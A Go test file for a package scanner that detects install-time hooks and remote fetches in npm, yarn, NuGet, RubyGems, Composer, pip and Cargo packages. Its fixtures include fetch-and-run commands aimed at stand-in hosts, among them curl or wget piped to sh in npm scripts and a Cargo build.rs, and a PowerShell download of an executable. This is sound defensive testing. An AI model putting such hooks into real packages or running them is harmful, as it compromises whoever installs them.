package intelligence

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"context"
	"strings"
	"testing"
)

// buildZip produces a zip from a set of (name, body) pairs — matches
// the shape of a NuGet .nupkg.
func buildZip(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for name, body := range files {
		w, err := zw.Create(name)
		if err != nil {
			t.Fatalf("zip Create: %v", err)
		}
		if _, err := w.Write([]byte(body)); err != nil {
			t.Fatalf("zip Write: %v", err)
		}
	}
	if err := zw.Close(); err != nil {
		t.Fatalf("zip Close: %v", err)
	}
	return buf.Bytes()
}

func containsSeen(seen []string, needleSubstr string) bool {
	for _, s := range seen {
		if strings.Contains(s, needleSubstr) {
			return true
		}
	}
	return false
}

// buildTGZ produces a gzipped tar from a set of (name, body) pairs. This
// matches the shape of an npm / pip sdist / cargo .crate upload.
func buildTGZ(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gw)
	for name, body := range files {
		hdr := &tar.Header{
			Name: name,
			Mode: 0o644,
			Size: int64(len(body)),
		}
		if err := tw.WriteHeader(hdr); err != nil {
			t.Fatalf("WriteHeader: %v", err)
		}
		if _, err := tw.Write([]byte(body)); err != nil {
			t.Fatalf("Write: %v", err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatalf("tar Close: %v", err)
	}
	if err := gw.Close(); err != nil {
		t.Fatalf("gzip Close: %v", err)
	}
	return buf.Bytes()
}

func TestInstallScriptsProvider_DetectsRemoteFetch(t *testing.T) {
	p := newInstallScriptsProvider()
	if !p.Supports("npm") {
		t.Fatalf("npm should be supported")
	}
	if !p.NeedsArtifact() {
		t.Fatalf("provider should report NeedsArtifact=true")
	}

	// npm convention: tarball entries live under a "package/" prefix.
	body := `{"name":"evil","version":"1.0.0","scripts":{"postinstall":"curl https://evil.example.com/x | sh"}}`
	payload := buildTGZ(t, map[string]string{
		"package/package.json": body,
	})

	partial, err := p.Run(context.Background(), Request{
		Key:      Key{Ecosystem: "npm", Package: "evil", Version: "1.0.0"},
		Artifact: &ArtifactHandle{Bytes: payload},
	}, nil)
	if err != nil {
		t.Fatalf("Run err: %v", err)
	}
	if partial.Scan == nil {
		t.Fatalf("expected Scan to be populated")
	}
	if !partial.Scan.Performed {
		t.Fatalf("Performed should be true")
	}
	if !partial.Scan.HasInstallScript {
		t.Fatalf("HasInstallScript should be true")
	}
	if !partial.Scan.InstallScriptFetches {
		t.Fatalf("InstallScriptFetches should be true for curl | sh")
	}
	if partial.Scan.InstallScriptKind != "fetches_remote" {
		t.Fatalf("InstallScriptKind: got %q, want fetches_remote", partial.Scan.InstallScriptKind)
	}
}

func TestInstallScriptsProvider_CleanPackageNoScripts(t *testing.T) {
	p := newInstallScriptsProvider()
	payload := buildTGZ(t, map[string]string{
		"package/package.json": `{"name":"clean","version":"1.0.0"}`,
	})

	partial, err := p.Run(context.Background(), Request{
		Key:      Key{Ecosystem: "npm", Package: "clean", Version: "1.0.0"},
		Artifact: &ArtifactHandle{Bytes: payload},
	}, nil)
	if err != nil {
		t.Fatalf("Run err: %v", err)
	}
	if partial.Scan == nil {
		t.Fatalf("expected Scan populated even for clean package")
	}
	if partial.Scan.HasInstallScript {
		t.Fatalf("clean package should not show an install script")
	}
	if partial.Scan.InstallScriptKind != "none" {
		t.Fatalf("Kind: got %q, want none", partial.Scan.InstallScriptKind)
	}
}

func TestInstallScriptsProvider_NilArtifactShortCircuits(t *testing.T) {
	p := newInstallScriptsProvider()
	partial, err := p.Run(context.Background(), Request{
		Key: Key{Ecosystem: "npm", Package: "x", Version: "1.0.0"},
	}, nil)
	if err != nil {
		t.Fatalf("Run err: %v", err)
	}
	if partial.Scan != nil {
		t.Fatalf("expected empty PartialReport on nil artifact, got %+v", partial.Scan)
	}
}

func TestInstallScriptsProvider_UnsupportedEcosystem(t *testing.T) {
	p := newInstallScriptsProvider()
	if p.Supports("docker") {
		t.Fatalf("docker should not be supported — no install-script parser")
	}
	if p.Supports("") {
		t.Fatalf("empty ecosystem should not be supported")
	}
}

func TestInstallScriptsProvider_YarnAliasedToNPM(t *testing.T) {
	p := newInstallScriptsProvider()
	if !p.Supports("yarn") {
		t.Fatalf("yarn should be supported (aliased to npm)")
	}
	payload := buildTGZ(t, map[string]string{
		"package/package.json": `{"name":"evil","version":"1.0.0","scripts":{"preinstall":"wget -O- https://x | sh"}}`,
	})
	partial, err := p.Run(context.Background(), Request{
		Key:      Key{Ecosystem: "yarn", Package: "evil", Version: "1.0.0"},
		Artifact: &ArtifactHandle{Bytes: payload},
	}, nil)
	if err != nil {
		t.Fatalf("Run err: %v", err)
	}
	if partial.Scan == nil || !partial.Scan.InstallScriptFetches {
		t.Fatalf("expected yarn alias to detect remote fetch, got %+v", partial.Scan)
	}
}

func TestInstallScriptsProvider_NuGetDetectsHookScript(t *testing.T) {
	p := newInstallScriptsProvider()
	if !p.Supports("nuget") {
		t.Fatalf("nuget should be supported")
	}
	payload := buildZip(t, map[string]string{
		"package.nuspec":            "<package/>",
		"tools/install.ps1":         `Invoke-WebRequest "https://evil.example.com/x.exe" -OutFile a.exe`,
		"tools/net45/uninstall.ps1": `Write-Host clean`,
		"tools/init.ps1":            `Write-Host hello`,
		"lib/net45/Some.dll":        "MZ",
	})
	partial, err := p.Run(context.Background(), Request{
		Key:      Key{Ecosystem: "nuget", Package: "evil", Version: "1.0.0"},
		Artifact: &ArtifactHandle{Bytes: payload},
	}, nil)
	if err != nil {
		t.Fatalf("Run err: %v", err)
	}
	if partial.Scan == nil {
		t.Fatalf("expected Scan populated")
	}
	if !partial.Scan.HasInstallScript {
		t.Fatalf("HasInstallScript should be true (PowerShell hooks present)")
	}
	if !partial.Scan.InstallScriptFetches {
		t.Fatalf("InstallScriptFetches should be true (Invoke-WebRequest)")
	}
	if partial.Scan.InstallScriptKind != "fetches_remote" {
		t.Fatalf("Kind: got %q want fetches_remote", partial.Scan.InstallScriptKind)
	}
	if !containsSeen(partial.Scan.ManifestFilesSeen, "install.ps1") {
		t.Fatalf("ManifestFilesSeen should reference install.ps1: %v", partial.Scan.ManifestFilesSeen)
	}
}

func TestInstallScriptsProvider_NuGetCleanPackageNoHooks(t *testing.T) {
	p := newInstallScriptsProvider()
	payload := buildZip(t, map[string]string{
		"package.nuspec":     "<package/>",
		"lib/net45/Some.dll": "MZ",
	})
	partial, err := p.Run(context.Background(), Request{
		Key:      Key{Ecosystem: "nuget", Package: "clean", Version: "1.0.0"},
		Artifact: &ArtifactHandle{Bytes: payload},
	}, nil)
	if err != nil {
		t.Fatalf("Run err: %v", err)
	}
	if partial.Scan != nil {
		t.Fatalf("expected empty PartialReport when no NuGet hooks present, got %+v", partial.Scan)
	}
}

func TestInstallScriptsProvider_RubyGemsExtensionsField(t *testing.T) {
	p := newInstallScriptsProvider()
	gemspec := `Gem::Specification.new do |s|
  s.name = "evil"
  s.version = "1.0.0"
  s.extensions = ["ext/evil/extconf.rb"]
end`
	payload := buildTGZ(t, map[string]string{
		"evil.gemspec": gemspec,
	})
	partial, err := p.Run(context.Background(), Request{
		Key:      Key{Ecosystem: "rubygems", Package: "evil", Version: "1.0.0"},
		Artifact: &ArtifactHandle{Bytes: payload},
	}, nil)
	if err != nil {
		t.Fatalf("Run err: %v", err)
	}
	if partial.Scan == nil {
		t.Fatalf("expected Scan populated")
	}
	if !partial.Scan.HasInstallScript {
		t.Fatalf("HasInstallScript should be true for s.extensions")
	}
	if !containsSeen(partial.Scan.ManifestFilesSeen, "extconf.rb") {
		t.Fatalf("expected extconf.rb in ManifestFilesSeen: %v", partial.Scan.ManifestFilesSeen)
	}
}

func TestInstallScriptsProvider_ComposerBinField(t *testing.T) {
	p := newInstallScriptsProvider()
	composer := `{"name":"evil/p","bin":["bin/evil","bin/evil2"]}`
	payload := buildTGZ(t, map[string]string{
		"composer.json": composer,
	})
	partial, err := p.Run(context.Background(), Request{
		Key:      Key{Ecosystem: "composer", Package: "evil/p", Version: "1.0.0"},
		Artifact: &ArtifactHandle{Bytes: payload},
	}, nil)
	if err != nil {
		t.Fatalf("Run err: %v", err)
	}
	if partial.Scan == nil {
		t.Fatalf("expected Scan populated")
	}
	if !partial.Scan.HasInstallScript {
		t.Fatalf("HasInstallScript should be true for composer bin field")
	}
	if !containsSeen(partial.Scan.ManifestFilesSeen, "bin:bin/evil") {
		t.Fatalf("expected bin entry surfaced: %v", partial.Scan.ManifestFilesSeen)
	}
}

func TestInstallScriptsProvider_ComposerBinStringForm(t *testing.T) {
	p := newInstallScriptsProvider()
	composer := `{"name":"evil/p","bin":"bin/evil"}`
	payload := buildTGZ(t, map[string]string{
		"composer.json": composer,
	})
	partial, err := p.Run(context.Background(), Request{
		Key:      Key{Ecosystem: "composer", Package: "evil/p", Version: "1.0.0"},
		Artifact: &ArtifactHandle{Bytes: payload},
	}, nil)
	if err != nil {
		t.Fatalf("Run err: %v", err)
	}
	if partial.Scan == nil || !partial.Scan.HasInstallScript {
		t.Fatalf("composer bin (string) should mark HasInstallScript: %+v", partial.Scan)
	}
}

func TestInstallScriptsProvider_PythonSetupCfgFallback(t *testing.T) {
	p := newInstallScriptsProvider()
	setupPy := "from setuptools import setup\nsetup()\n"
	setupCfg := "[options]\ninstall_requires =\n    requests\n\n[options.entry_points]\nconsole_scripts =\n    evil = evil.main:run\n"
	payload := buildTGZ(t, map[string]string{
		"setup.py":  setupPy,
		"setup.cfg": setupCfg,
	})
	partial, err := p.Run(context.Background(), Request{
		Key:      Key{Ecosystem: "pip", Package: "evil", Version: "1.0.0"},
		Artifact: &ArtifactHandle{Bytes: payload},
	}, nil)
	if err != nil {
		t.Fatalf("Run err: %v", err)
	}
	if partial.Scan == nil {
		t.Fatalf("expected Scan populated")
	}
	if !partial.Scan.HasInstallScript {
		t.Fatalf("HasInstallScript should be true via setup.cfg entry_points")
	}
	if !containsSeen(partial.Scan.ManifestFilesSeen, "setup.cfg") {
		t.Fatalf("expected setup.cfg in ManifestFilesSeen: %v", partial.Scan.ManifestFilesSeen)
	}
}

func TestInstallScriptsProvider_CargoBuildRsScansShellExec(t *testing.T) {
	p := newInstallScriptsProvider()
	cargoToml := `[package]
name = "evil"
version = "1.0.0"
build = "build.rs"
`
	buildRs := `use std::process::Command;
fn main() {
    let _ = Command::new("/bin/sh").arg("-c").arg("curl https://evil.example.com | sh").status();
}
`
	payload := buildTGZ(t, map[string]string{
		"Cargo.toml": cargoToml,
		"build.rs":   buildRs,
	})
	partial, err := p.Run(context.Background(), Request{
		Key:      Key{Ecosystem: "cargo", Package: "evil", Version: "1.0.0"},
		Artifact: &ArtifactHandle{Bytes: payload},
	}, nil)
	if err != nil {
		t.Fatalf("Run err: %v", err)
	}
	if partial.Scan == nil {
		t.Fatalf("expected Scan populated")
	}
	if !partial.Scan.HasInstallScript {
		t.Fatalf("HasInstallScript should be true (Cargo build.rs present)")
	}
	if !partial.Scan.InstallScriptFetches {
		t.Fatalf("InstallScriptFetches should be true (build.rs runs /bin/sh + curl)")
	}
	if !containsSeen(partial.Scan.ManifestFilesSeen, "build.rs:") {
		t.Fatalf("expected build.rs sub-finding in ManifestFilesSeen: %v", partial.Scan.ManifestFilesSeen)
	}
}
